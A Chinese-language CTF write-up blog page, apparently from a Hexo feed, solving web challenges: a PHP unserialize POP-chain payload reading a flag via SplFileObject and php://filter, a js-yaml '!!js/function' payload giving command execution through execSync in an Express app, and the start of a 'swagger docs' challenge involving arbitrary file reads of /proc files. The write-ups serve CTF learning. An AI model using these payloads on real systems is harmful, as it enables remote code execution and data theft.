<span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;y1-&gt;y1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="comment">//public $SplFileObject=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;May be you can get what you want here&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$one</span>, <span class="variable">$two</span>) &#123;</span><br><span class="line">            <span class="variable">$three</span> = <span class="keyword">new</span> <span class="variable">$two</span>(<span class="variable">$one</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$three</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$tmp</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;D0g3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;D0g3&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>链子:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You::wakeup-&gt;Luck::__unset-&gt;Luck::toString-&gt;Flag::invoke</span><br></pre></td></tr></table></figure><br>主要是Flag类中原生类的利用,我们通过调试可以发现<code>$this</code>我们是可以自己加的,在反序列化的时候如果出现原来类不存在的变量也会添加进去<br>然后就是利用两个原生类来寻找flag位置和读取flag</p>
<ul>
<li>SplFileObject读</li>
<li>DirectoryIterator找(列出目录下的文件)<br>payload:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">You</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Luck</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ll2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$md5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lll3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setmd5</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;md5 = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SplFileObject</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/FfffLlllLaAaaggGgGg&quot;</span>;</span><br><span class="line">    <span class="comment">//public $DirectoryIterator=&quot;/&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;May be you can get what you want here&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$one</span>, <span class="variable">$two</span>) &#123;</span><br><span class="line">            <span class="variable">$three</span> = <span class="keyword">new</span> <span class="variable">$two</span>(<span class="variable">$one</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$three</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$tmp</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line"><span class="variable">$target</span>-&gt;l1=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Luck</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">setmd5</span>(<span class="variable">$target</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">You</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;y1=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<h3 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ini = <span class="built_in">require</span>(<span class="string">&#x27;iniparser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> xml2js = <span class="built_in">require</span>(<span class="string">&#x27;xml2js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> properties = <span class="built_in">require</span>(<span class="string">&#x27;properties&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> yaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置存储配置</span></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">memoryStorage</span>();</span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">storage</span>: storage &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">	<span class="attr">secret</span>: <span class="string">&#x27;welcome&#x27;</span>,<span class="comment">//</span></span><br><span class="line">	<span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">	<span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">	<span class="attr">cookie</span>: &#123;</span><br><span class="line">		<span class="attr">maxAge</span>: <span class="number">3600000</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/convert&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;configFile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded.&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">format</span>!=<span class="string">&quot;yaml&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;该功能暂未开始使用.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> fileExtension = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">	<span class="keyword">const</span> fileBuffer = req.<span class="property">file</span>.<span class="property">buffer</span>.<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fileExtension === <span class="string">&#x27;.ini&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">// 处理 INI 文件</span></span><br><span class="line">		<span class="keyword">const</span> parsedData = ini.<span class="title function_">parseString</span>(fileBuffer);</span><br><span class="line">		output = yaml.<span class="title function_">dump</span>(parsedData);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension === <span class="string">&#x27;.xml&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">// 处理 XML 文件</span></span><br><span class="line">		xml2js.<span class="title function_">parseString</span>(fileBuffer, <span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error parsing XML.&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			output = yaml.<span class="title function_">dump</span>(result);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension === <span class="string">&#x27;.properties&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">// 处理 Properties 文件</span></span><br><span class="line">		properties.<span class="title function_">parse</span>(fileBuffer, <span class="function">(<span class="params">err, parsedData</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error parsing properties file:&#x27;</span>, err);</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error parsing properties file.&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			output = yaml.<span class="title function_">dump</span>(parsedData);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension === <span class="string">&#x27;.yaml&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">// 处理 YAML 文件</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 尝试解析 YAML 文件</span></span><br><span class="line">			<span class="keyword">const</span> yamlData = yaml.<span class="title function_">load</span>(fileBuffer);</span><br><span class="line">			<span class="comment">// 如果成功解析，yamlData 变量将包含 YAML 文件的内容</span></span><br><span class="line">			output = yaml.<span class="title function_">dump</span>(yamlData);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid YAML format: &#x27;</span> + e.<span class="property">message</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (output) &#123;</span><br><span class="line">		<span class="keyword">let</span> name = <span class="string">&#x27;ctfer&#x27;</span>;</span><br><span class="line">		<span class="keyword">const</span> yamlData = yaml.<span class="title function_">load</span>(output);</span><br><span class="line">		<span class="keyword">if</span> (yamlData &amp;&amp; yamlData.<span class="property">name</span>) &#123;</span><br><span class="line">			 name = yamlData.<span class="property">name</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		req.<span class="property">session</span>.<span class="property">outputData</span>=name;</span><br><span class="line">		req.<span class="property">session</span>.<span class="property">outputData</span>=output;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;preview&#x27;</span>, &#123; <span class="attr">name</span>: name,<span class="attr">output</span>: output &#125;); <span class="comment">// 渲染 preview.ejs 模板</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unsupported format.&#x27;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/download&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (output) &#123;</span><br><span class="line">		<span class="keyword">const</span> outputData = req.<span class="property">session</span>.<span class="property">outputData</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 设置响应头，指定文件的内容类型为YAML</span></span><br><span class="line">		res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-yaml&#x27;</span>);</span><br><span class="line">		<span class="comment">// 设置响应头，指定文件名</span></span><br><span class="line">		res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment; filename=&quot;output.yaml&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 将转换后的文件内容发送给客户端</span></span><br><span class="line">		res.<span class="title function_">send</span>(outputData);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found.&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">name</span>==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		cp.<span class="title function_">execFile</span>(<span class="string">&#x27;/readflag&#x27;</span>, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, err);</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found.&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			res.<span class="title function_">send</span>(stdout);</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Permission denied.&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App is running on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>按道理是看package.json的,题目源码提示了只需要看yaml相关的<br>package.json`<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;web&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.1.9&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;express&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.18.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;express-session&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.17.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;iniparser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;js-yaml&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.14.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;multer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.4.5-lts.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.2.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;xml2js&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.6.2&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>我一开始搜的”js-yaml”: “^3.14.1”,发现一个CVE-2013-4660,但是那篇文章对应的版本不对就直接没看了,后来发现就是那个CVE<br>参考:</p>
<ul>
<li><a href="https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/">在 JS-YAML Node.js 模块中通过 YAML 执行代码 » Neal Poole</a></li>
</ul>
<p>通过调试可以发现最后ejs渲染的是name属性<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231224004807.png" alt="image.png"><br>1.yaml<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;name&quot;</span> <span class="string">:</span> &#123; <span class="attr">toString:</span> <span class="type">!!js/function</span> <span class="string">&quot;function()&#123; flag = process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString(); return flag;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>此时写个demo<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> yaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> yamlData=yaml.<span class="title function_">load</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./1.yaml&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(yamlData);</span><br><span class="line">output = yaml.<span class="title function_">dump</span>(yamlData);<span class="comment">//最后渲染的output值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line"><span class="keyword">const</span> lastdata=yaml.<span class="title function_">load</span>(output);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lastdata.<span class="property">name</span>);<span class="comment">//最后渲染的name值</span></span><br></pre></td></tr></table></figure><br>ejs渲染的时候会调用toString()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231224005435.png" alt="image.png"><br>改一下whoami即可拿到flag<br>还有两个Java和一个python(实现任意文件读取了卡住了)没做出来,准备后面复现了</p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023第六届安洵杯复现</title>
    <url>/2024/02/06/2023%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>源码位置: <a href="https://github.com/D0g3-Lab/i-SOON_CTF_2023/tree/main/web">https://github.com/D0g3-Lab/i-SOON_CTF_2023/tree/main/web</a></p>
<h3 id="swagger-docs"><a href="#swagger-docs" class="headerlink" title="swagger docs"></a>swagger docs</h3><p>直接docker-compose up -d发现容器会直接exit,直接去desktop里看一下<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231225201252.png" alt="image.png"><br>但是我们可以发现是有run.sh的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231225201323.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 2256:5000 -it --entrypoint /bin/bash swaggerdocs-service</span><br></pre></td></tr></table></figure>
<p>把run.sh的命令一下就行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup python api.py &amp; python app.py</span><br></pre></td></tr></table></figure></p>
<p>一开始用swagger-exp这个工具扫,但是发现没啥用,主要的接口在网站上面的文档都写了,题目也就用这几个</p>
<ul>
<li>/api-base/v0/register: 注册</li>
<li>/api-base/v0/login: 登录</li>
<li>/api-base/v0/search: 任意文件读取</li>
<li>/api-base/v0/update: 原型链污染</li>
<li>/api-base/v0/logout: 登出<br>注册登录拿token,Content-type要改json<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226004812.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226004825.png" alt="image.png"><br>一开始读/proc/self/environ环境变量没有flag,读cmdline,run.sh,读源码<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226004848.png" alt="image.png"></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,  jsonify,send_file,render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>]=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;fake_flag&#x27;</span></span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">response0 = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span></span><br><span class="line">&#125;</span><br><span class="line">response1=&#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: current_time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response2 = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username,password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2),<span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span 